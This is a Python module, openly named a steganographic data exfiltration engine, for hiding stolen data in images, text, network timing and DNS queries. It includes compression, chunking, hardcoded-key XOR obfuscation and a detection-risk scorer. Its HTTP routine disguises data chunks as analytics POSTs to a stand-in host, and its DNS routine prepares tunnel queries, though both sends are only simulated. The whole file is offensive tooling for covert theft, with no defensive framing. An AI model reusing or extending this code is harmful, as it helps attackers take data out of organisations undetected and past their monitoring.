"""
Steganographic Data Exfiltration Engine
Advanced covert data extraction using multiple steganographic techniques.
Embeds data in images, audio, video, network protocols, and filesystem metadata.
"""

import asyncio
import hashlib
import struct
import zlib
import random
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Set, Tuple, Any, Generator
from datetime import datetime
import base64
import math


class StegoMedium(Enum):
    """Steganographic carrier types"""
    IMAGE_LSB = auto()
    IMAGE_DCT = auto()
    IMAGE_PALETTE = auto()
    AUDIO_LSB = auto()
    AUDIO_ECHO = auto()
    AUDIO_PHASE = auto()
    VIDEO_FRAME = auto()
    VIDEO_MOTION = auto()
    NETWORK_TIMING = auto()
    NETWORK_HEADER = auto()
    NETWORK_PAYLOAD = auto()
    DNS_SUBDOMAIN = auto()
    HTTPS_PADDING = auto()
    FILESYSTEM_SLACK = auto()
    FILESYSTEM_ADS = auto()
    UNICODE_ZERO_WIDTH = auto()


class ExfilMethod(Enum):
    """Exfiltration transport methods"""
    HTTP_COVERT = auto()
    DNS_TUNNEL = auto()
    ICMP_COVERT = auto()
    SMTP_ATTACHMENT = auto()
    CLOUD_STORAGE = auto()
    SOCIAL_MEDIA = auto()
    IMAGE_HOSTING = auto()
    BLOCKCHAIN = auto()


class EncryptionLevel(Enum):
    """Data encryption levels"""
    NONE = auto()
    XOR = auto()
    AES = auto()
    CHACHA = auto()
    CASCADED = auto()


@dataclass
class StegoPayload:
    """Steganographic payload"""
    id: str
    data: bytes
    encrypted_data: bytes
    medium: StegoMedium
    carrier_size: int
    payload_size: int
    embedding_ratio: float
    checksum: str
    created_at: datetime = field(default_factory=datetime.now)


@dataclass
class ExfilSession:
    """Data exfiltration session"""
    id: str
    target_data: bytes
    chunks: List[StegoPayload]
    method: ExfilMethod
    status: str = "pending"
    progress: float = 0.0
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None


@dataclass
class CarrierFile:
    """Carrier file for steganography"""
    id: str
    filename: str
    medium_type: StegoMedium
    file_data: bytes
    capacity: int  # bytes
    used_capacity: int = 0


class LSBEncoder:
    """Least Significant Bit encoding"""
    
    def __init__(self, bits_per_sample: int = 1):
        self.bits_per_sample = min(bits_per_sample, 4)
    
    def encode(self, carrier: bytes, payload: bytes) -> bytes:
        """Encode payload into carrier using LSB"""
        # Calculate capacity
        capacity = len(carrier) // 8 * self.bits_per_sample
        
        if len(payload) > capacity:
            raise ValueError(f"Payload too large: {len(payload)} > {capacity}")
        
        # Prepend length
        length_bytes = struct.pack('>I', len(payload))
        full_payload = length_bytes + payload
        
        # Convert to bits
        bits = self._bytes_to_bits(full_payload)
        
        # Embed bits
        carrier_list = list(carrier)
        bit_idx = 0
        
        for i in range(len(carrier_list)):
            if bit_idx >= len(bits):
                break
            
            for b in range(self.bits_per_sample):
                if bit_idx >= len(bits):
                    break
                
                # Clear LSBs and set new bit
                mask = ~(1 << b)
                carrier_list[i] = (carrier_list[i] & mask) | (bits[bit_idx] << b)
                bit_idx += 1
        
        return bytes(carrier_list)
    
    def decode(self, carrier: bytes) -> bytes:
        """Decode payload from carrier"""
        # Extract bits
        bits = []
        
        for byte in carrier:
            for b in range(self.bits_per_sample):
                bits.append((byte >> b) & 1)
        
        # Get length (first 32 bits)
        length_bits = bits[:32]
        length = 0
        for i, bit in enumerate(length_bits):
            length |= bit << i
        
        # Swap endianness
        length = struct.unpack('<I', struct.pack('>I', length))[0]
        
        # Validate length
        if length > (len(bits) - 32) // 8:
            length = min(length, (len(bits) - 32) // 8)
        
        # Extract payload
        payload_bits = bits[32:32 + length * 8]
        return self._bits_to_bytes(payload_bits)
    
    def _bytes_to_bits(self, data: bytes) -> List[int]:
        """Convert bytes to list of bits"""
        bits = []
        for byte in data:
            for i in range(8):
                bits.append((byte >> i) & 1)
        return bits
    
    def _bits_to_bytes(self, bits: List[int]) -> bytes:
        """Convert list of bits to bytes"""
        bytes_list = []
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(min(8, len(bits) - i)):
                byte |= bits[i + j] << j
            bytes_list.append(byte)
        return bytes(bytes_list)
    
    def calculate_capacity(self, carrier_size: int) -> int:
        """Calculate embedding capacity"""
        return (carrier_size * self.bits_per_sample) // 8 - 4  # Minus header


class DCTEncoder:
    """DCT coefficient modification for images"""
    
    def __init__(self, quality: int = 75):
        self.quality = quality
        self.block_size = 8
    
    def _dct_1d(self, vector: List[float]) -> List[float]:
        """1D DCT transform"""
        n = len(vector)
        result = [0.0] * n
        
        for k in range(n):
            sum_val = 0.0
            for i in range(n):
                sum_val += vector[i] * math.cos(math.pi * k * (2 * i + 1) / (2 * n))
            
            if k == 0:
                result[k] = sum_val / math.sqrt(n)
            else:
                result[k] = sum_val * math.sqrt(2 / n)
        
        return result
    
    def _idct_1d(self, vector: List[float]) -> List[float]:
        """1D inverse DCT transform"""
        n = len(vector)
        result = [0.0] * n
        
        for i in range(n):
            sum_val = vector[0] / math.sqrt(n)
            for k in range(1, n):
                sum_val += vector[k] * math.sqrt(2 / n) * math.cos(
                    math.pi * k * (2 * i + 1) / (2 * n)
                )
            result[i] = sum_val
        
        return result
    
    def encode_block(self, block: List[List[int]], bit: int) -> List[List[int]]:
        """Encode bit into 8x8 block using DCT"""
        # Apply 2D DCT
        dct_block = [[0.0] * 8 for _ in range(8)]
        
        for i in range(8):
            row = [float(block[i][j]) for j in range(8)]
            dct_row = self._dct_1d(row)
            for j in range(8):
                dct_block[i][j] = dct_row[j]
        
        for j in range(8):
            col = [dct_block[i][j] for i in range(8)]
            dct_col = self._dct_1d(col)
            for i in range(8):
                dct_block[i][j] = dct_col[i]
        
        # Modify middle-frequency coefficient
        coef_i, coef_j = 4, 4
        coef = dct_block[coef_i][coef_j]
        
        # Quantize and embed bit
        quant_step = 10
        quantized = round(coef / quant_step)
        
        if bit == 1:
            if quantized % 2 == 0:
                quantized += 1
        else:
            if quantized % 2 == 1:
                quantized += 1
        
        dct_block[coef_i][coef_j] = quantized * quant_step
        
        # Apply inverse 2D DCT
        for j in range(8):
            col = [dct_block[i][j] for i in range(8)]
            idct_col = self._idct_1d(col)
            for i in range(8):
                dct_block[i][j] = idct_col[i]
        
        result = [[0] * 8 for _ in range(8)]
        for i in range(8):
            row = [dct_block[i][j] for j in range(8)]
            idct_row = self._idct_1d(row)
            for j in range(8):
                result[i][j] = max(0, min(255, int(round(idct_row[j]))))
        
        return result


class TimingEncoder:
    """Network timing-based steganography"""
    
    def __init__(self, base_delay: float = 0.1, bit_delay: float = 0.05):
        self.base_delay = base_delay
        self.bit_delay = bit_delay
    
    def encode_timing(self, data: bytes) -> List[float]:
        """Generate timing pattern for data"""
        timings = []
        
        for byte in data:
            for i in range(8):
                bit = (byte >> i) & 1
                if bit == 1:
                    timings.append(self.base_delay + self.bit_delay)
                else:
                    timings.append(self.base_delay)
        
        return timings
    
    def decode_timing(self, timings: List[float]) -> bytes:
        """Decode data from timing pattern"""
        threshold = self.base_delay + (self.bit_delay / 2)
        
        bits = [1 if t > threshold else 0 for t in timings]
        
        # Convert bits to bytes
        bytes_list = []
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(min(8, len(bits) - i)):
                byte |= bits[i + j] << j
            bytes_list.append(byte)
        
        return bytes(bytes_list)


class UnicodeEncoder:
    """Zero-width Unicode character steganography"""
    
    def __init__(self):
        # Zero-width characters
        self.zero_width_space = '\u200b'      # 0
        self.zero_width_non_joiner = '\u200c'  # 1
        self.zero_width_joiner = '\u200d'      # separator
    
    def encode(self, cover_text: str, payload: bytes) -> str:
        """Hide payload in text using zero-width characters"""
        # Convert payload to binary string
        binary = ''.join(format(byte, '08b') for byte in payload)
        
        # Create hidden message
        hidden = ''
        for bit in binary:
            if bit == '0':
                hidden += self.zero_width_space
            else:
                hidden += self.zero_width_non_joiner
        
        # Insert after first character
        if len(cover_text) > 0:
            return cover_text[0] + self.zero_width_joiner + hidden + cover_text[1:]
        return hidden
    
    def decode(self, stego_text: str) -> bytes:
        """Extract payload from text"""
        # Find zero-width characters
        bits = []
        
        for char in stego_text:
            if char == self.zero_width_space:
                bits.append(0)
            elif char == self.zero_width_non_joiner:
                bits.append(1)
        
        # Convert to bytes
        bytes_list = []
        for i in range(0, len(bits), 8):
            if i + 8 <= len(bits):
                byte = 0
                for j in range(8):
                    byte |= bits[i + j] << (7 - j)
                bytes_list.append(byte)
        
        return bytes(bytes_list)


class DNSEncoder:
    """DNS subdomain steganography"""
    
    def __init__(self, base_domain: str = "data.local"):
        self.base_domain = base_domain
        self.max_label_length = 63
        self.max_subdomain_length = 253 - len(base_domain) - 1
    
    def encode(self, data: bytes) -> List[str]:
        """Encode data as DNS queries"""
        # Base32 encode for DNS-safe characters
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Split into DNS labels
        queries = []
        chunk_size = self.max_label_length - 10  # Leave room for index
        
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        total = len(chunks)
        
        for i, chunk in enumerate(chunks):
            # Format: {index}-{total}-{data}.{base_domain}
            label = f"{i:03d}-{total:03d}-{chunk}"
            query = f"{label}.{self.base_domain}"
            queries.append(query)
        
        return queries
    
    def decode(self, queries: List[str]) -> bytes:
        """Decode data from DNS queries"""
        # Parse and sort by index
        chunks = {}
        
        for query in queries:
            # Remove base domain
            subdomain = query.replace(f".{self.base_domain}", "")
            parts = subdomain.split('-', 2)
            
            if len(parts) >= 3:
                index = int(parts[0])
                chunks[index] = parts[2]
        
        # Reassemble
        encoded = ''.join(chunks[i] for i in sorted(chunks.keys()))
        
        # Add padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        return base64.b32decode(encoded.upper())


class ChunkedExfiltrator:
    """Chunked data exfiltration with error correction"""
    
    def __init__(self, chunk_size: int = 1024):
        self.chunk_size = chunk_size
    
    def prepare_exfil(self, data: bytes, session_id: str) -> List[Dict[str, Any]]:
        """Prepare data for exfiltration"""
        # Compress
        compressed = zlib.compress(data, level=9)
        
        # Add header
        header = struct.pack('>I', len(data))  # Original size
        payload = header + compressed
        
        # Chunk
        chunks = []
        total_chunks = (len(payload) + self.chunk_size - 1) // self.chunk_size
        
        for i in range(0, len(payload), self.chunk_size):
            chunk_data = payload[i:i+self.chunk_size]
            chunk_hash = hashlib.md5(chunk_data).hexdigest()[:8]
            
            chunks.append({
                "session_id": session_id,
                "chunk_index": i // self.chunk_size,
                "total_chunks": total_chunks,
                "data": chunk_data,
                "checksum": chunk_hash,
                "size": len(chunk_data)
            })
        
        return chunks
    
    def reassemble(self, chunks: List[Dict[str, Any]]) -> bytes:
        """Reassemble chunks into original data"""
        # Sort by index
        sorted_chunks = sorted(chunks, key=lambda x: x["chunk_index"])
        
        # Verify checksums and concatenate
        payload = b''
        for chunk in sorted_chunks:
            if hashlib.md5(chunk["data"]).hexdigest()[:8] == chunk["checksum"]:
                payload += chunk["data"]
        
        # Extract header
        original_size = struct.unpack('>I', payload[:4])[0]
        compressed = payload[4:]
        
        # Decompress
        return zlib.decompress(compressed)


class SteganographicEngine:
    """Main steganographic exfiltration engine"""
    
    def __init__(self, config, db):
        self.config = config
        self.db = db
        
        self.lsb_encoder = LSBEncoder(bits_per_sample=2)
        self.dct_encoder = DCTEncoder()
        self.timing_encoder = TimingEncoder()
        self.unicode_encoder = UnicodeEncoder()
        self.dns_encoder = DNSEncoder()
        self.chunked_exfil = ChunkedExfiltrator()
        
        self.sessions: Dict[str, ExfilSession] = {}
        self.carriers: Dict[str, CarrierFile] = {}
    
    async def create_session(self, data: bytes, medium: StegoMedium,
                             method: ExfilMethod) -> ExfilSession:
        """Create new exfiltration session"""
        session_id = hashlib.sha256(
            f"{datetime.now()}{random.random()}".encode()
        ).hexdigest()[:16]
        
        # Prepare chunks
        chunks = self.chunked_exfil.prepare_exfil(data, session_id)
        
        # Create payloads
        payloads = []
        for chunk_info in chunks:
            payload = await self._create_payload(chunk_info["data"], medium)
            payloads.append(payload)
        
        session = ExfilSession(
            id=session_id,
            target_data=data,
            chunks=payloads,
            method=method,
            start_time=datetime.now()
        )
        
        self.sessions[session_id] = session
        
        return session
    
    async def _create_payload(self, data: bytes, medium: StegoMedium) -> StegoPayload:
        """Create steganographic payload"""
        # Encrypt data
        key = hashlib.sha256(b"stego_key").digest()
        encrypted = self._xor_encrypt(data, key)
        
        # Calculate required carrier size
        if medium in [StegoMedium.IMAGE_LSB, StegoMedium.AUDIO_LSB]:
            carrier_size = len(encrypted) * 8 // self.lsb_encoder.bits_per_sample + 100
        else:
            carrier_size = len(encrypted) * 2
        
        payload_id = hashlib.md5(data).hexdigest()[:12]
        
        return StegoPayload(
            id=payload_id,
            data=data,
            encrypted_data=encrypted,
            medium=medium,
            carrier_size=carrier_size,
            payload_size=len(data),
            embedding_ratio=len(data) / carrier_size if carrier_size > 0 else 0,
            checksum=hashlib.md5(data).hexdigest()
        )
    
    async def embed_in_image(self, image_data: bytes, payload: bytes) -> bytes:
        """Embed payload in image using LSB"""
        # Simple implementation assuming raw RGB data
        return self.lsb_encoder.encode(image_data, payload)
    
    async def extract_from_image(self, stego_image: bytes) -> bytes:
        """Extract payload from stego image"""
        return self.lsb_encoder.decode(stego_image)
    
    async def embed_in_text(self, cover_text: str, payload: bytes) -> str:
        """Embed payload in text using zero-width chars"""
        return self.unicode_encoder.encode(cover_text, payload)
    
    async def extract_from_text(self, stego_text: str) -> bytes:
        """Extract payload from stego text"""
        return self.unicode_encoder.decode(stego_text)
    
    async def prepare_dns_exfil(self, data: bytes) -> List[str]:
        """Prepare data for DNS exfiltration"""
        return self.dns_encoder.encode(data)
    
    async def decode_dns_exfil(self, queries: List[str]) -> bytes:
        """Decode DNS exfiltrated data"""
        return self.dns_encoder.decode(queries)
    
    async def generate_timing_pattern(self, data: bytes) -> List[float]:
        """Generate timing pattern for covert channel"""
        return self.timing_encoder.encode_timing(data)
    
    async def decode_timing_pattern(self, timings: List[float]) -> bytes:
        """Decode data from timing pattern"""
        return self.timing_encoder.decode_timing(timings)
    
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Simple XOR encryption"""
        extended_key = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(d ^ k for d, k in zip(data, extended_key))
    
    async def exfiltrate_via_http(self, session_id: str) -> Dict[str, Any]:
        """Exfiltrate via HTTP covert channel"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
        
        session.status = "in_progress"
        results = []
        
        for i, payload in enumerate(session.chunks):
            # Simulate HTTP request with embedded data
            http_data = {
                "url": f"https://api.example.com/analytics",
                "method": "POST",
                "headers": {
                    "X-Request-ID": base64.b64encode(payload.encrypted_data[:32]).decode(),
                    "X-Session": session_id
                },
                "body": base64.b64encode(payload.encrypted_data).decode()
            }
            
            results.append(http_data)
            session.progress = (i + 1) / len(session.chunks)
        
        session.status = "completed"
        session.end_time = datetime.now()
        
        return {
            "session_id": session_id,
            "chunks_sent": len(results),
            "total_bytes": sum(len(p.data) for p in session.chunks)
        }
    
    async def exfiltrate_via_dns(self, session_id: str) -> Dict[str, Any]:
        """Exfiltrate via DNS tunnel"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
        
        session.status = "in_progress"
        all_queries = []
        
        for payload in session.chunks:
            queries = await self.prepare_dns_exfil(payload.encrypted_data)
            all_queries.extend(queries)
        
        session.status = "completed"
        session.end_time = datetime.now()
        
        return {
            "session_id": session_id,
            "dns_queries": len(all_queries),
            "sample_queries": all_queries[:5] if all_queries else []
        }
    
    def get_session_status(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get exfiltration session status"""
        session = self.sessions.get(session_id)
        if not session:
            return None
        
        return {
            "id": session.id,
            "status": session.status,
            "progress": session.progress,
            "total_chunks": len(session.chunks),
            "method": session.method.name,
            "data_size": len(session.target_data),
            "start_time": session.start_time.isoformat() if session.start_time else None,
            "end_time": session.end_time.isoformat() if session.end_time else None
        }
    
    def analyze_carrier_capacity(self, carrier_type: StegoMedium, 
                                 carrier_size: int) -> Dict[str, Any]:
        """Analyze carrier capacity for steganography"""
        if carrier_type == StegoMedium.IMAGE_LSB:
            capacity = self.lsb_encoder.calculate_capacity(carrier_size)
            embedding_rate = 12.5  # % for 1 bit per byte
        elif carrier_type == StegoMedium.IMAGE_DCT:
            capacity = carrier_size // 64  # 1 bit per 8x8 block
            embedding_rate = 1.5
        elif carrier_type == StegoMedium.UNICODE_ZERO_WIDTH:
            capacity = carrier_size // 2  # 4 bits per visible char
            embedding_rate = 50.0
        else:
            capacity = carrier_size // 10
            embedding_rate = 10.0
        
        return {
            "carrier_type": carrier_type.name,
            "carrier_size": carrier_size,
            "payload_capacity": capacity,
            "embedding_rate": embedding_rate,
            "detection_risk": self._assess_detection_risk(carrier_type, embedding_rate)
        }
    
    def _assess_detection_risk(self, medium: StegoMedium, 
                               embedding_rate: float) -> str:
        """Assess detection risk"""
        base_risk = {
            StegoMedium.IMAGE_LSB: 0.4,
            StegoMedium.IMAGE_DCT: 0.2,
            StegoMedium.AUDIO_LSB: 0.3,
            StegoMedium.NETWORK_TIMING: 0.5,
            StegoMedium.UNICODE_ZERO_WIDTH: 0.1,
            StegoMedium.DNS_SUBDOMAIN: 0.6
        }.get(medium, 0.5)
        
        # Adjust for embedding rate
        if embedding_rate > 50:
            risk = base_risk * 1.5
        elif embedding_rate > 25:
            risk = base_risk * 1.2
        else:
            risk = base_risk
        
        risk = min(risk, 1.0)
        
        if risk < 0.3:
            return "Low"
        elif risk < 0.6:
            return "Medium"
        else:
            return "High"
    
    def get_engine_stats(self) -> Dict[str, Any]:
        """Get engine statistics"""
        active_sessions = [s for s in self.sessions.values() 
                          if s.status == "in_progress"]
        completed_sessions = [s for s in self.sessions.values() 
                             if s.status == "completed"]
        
        total_exfil = sum(len(s.target_data) for s in completed_sessions)
        
        return {
            "total_sessions": len(self.sessions),
            "active_sessions": len(active_sessions),
            "completed_sessions": len(completed_sessions),
            "total_data_exfiltrated": total_exfil,
            "supported_mediums": [m.name for m in StegoMedium],
            "supported_methods": [m.name for m in ExfilMethod]
        }
